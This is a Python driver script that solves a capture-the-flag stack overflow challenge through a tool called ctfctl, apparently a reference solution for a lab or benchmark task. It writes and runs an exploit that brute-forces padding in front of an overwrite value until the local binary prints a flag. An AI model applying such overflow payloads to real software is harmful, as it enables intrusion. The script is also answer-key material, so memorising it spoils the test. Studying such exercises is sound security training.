#!/usr/bin/env python3
"""Deterministic driver: craft a stack overflow payload and run it through ctfctl."""
import argparse
import json
import re
import shutil
import struct
import subprocess
import sys
from pathlib import Path


def ctfctl(challenge_dir: Path, ctfctl: str, *args):
    proc = subprocess.run([ctfctl, "-C", str(challenge_dir), *args], capture_output=True, text=True)
    if proc.returncode != 0:
        raise SystemExit(f"ctfctl {' '.join(args)} failed: {(proc.stderr or '')[-400:]}")
    return json.loads(proc.stdout or "{}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--challenge-dir", type=Path, required=True)
    parser.add_argument("--root", type=Path, required=True)
    parser.add_argument("--ctfctl", required=True)
    args = parser.parse_args()
    challenge_dir: Path = args.challenge_dir

    vuln = challenge_dir / "work" / "vuln"
    shutil.copy2(challenge_dir / "original" / "vuln", vuln)
    vuln.chmod(0o755)
    ctfctl(challenge_dir, args.ctfctl, "tool", "elf", str(vuln))

    exploit = challenge_dir / "work" / "exploit.py"
    # Search a padding range so the exploit is robust to compiler stack layout.
    exploit.write_text(
        "import struct, subprocess, sys, re\n"
        f"target = {str(vuln)!r}\n"
        "for pad in range(32, 96):\n"
        "    payload = b'A' * pad + struct.pack('<I', 0x1337)\n"
        "    proc = subprocess.run([target], input=payload, capture_output=True)\n"
        "    out = proc.stdout.decode(errors='replace')\n"
        "    if 'flag{' in out:\n"
        "        sys.stdout.write(out)\n"
        "        raise SystemExit(0)\n"
        "raise SystemExit(1)\n",
        encoding="utf-8",
    )
    run = subprocess.run(
        [args.ctfctl, "-C", str(challenge_dir), "run", "--tag", "bof-run", "--", "python3", str(exploit)],
        capture_output=True,
        text=True,
    )
    match = re.search(r"flag\{[^}]+\}", run.stdout or "")
    if not match:
        raise SystemExit(f"no flag in exploit output: {(run.stdout or '')[-400:]}")
    print(f"FLAG={match.group(0)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
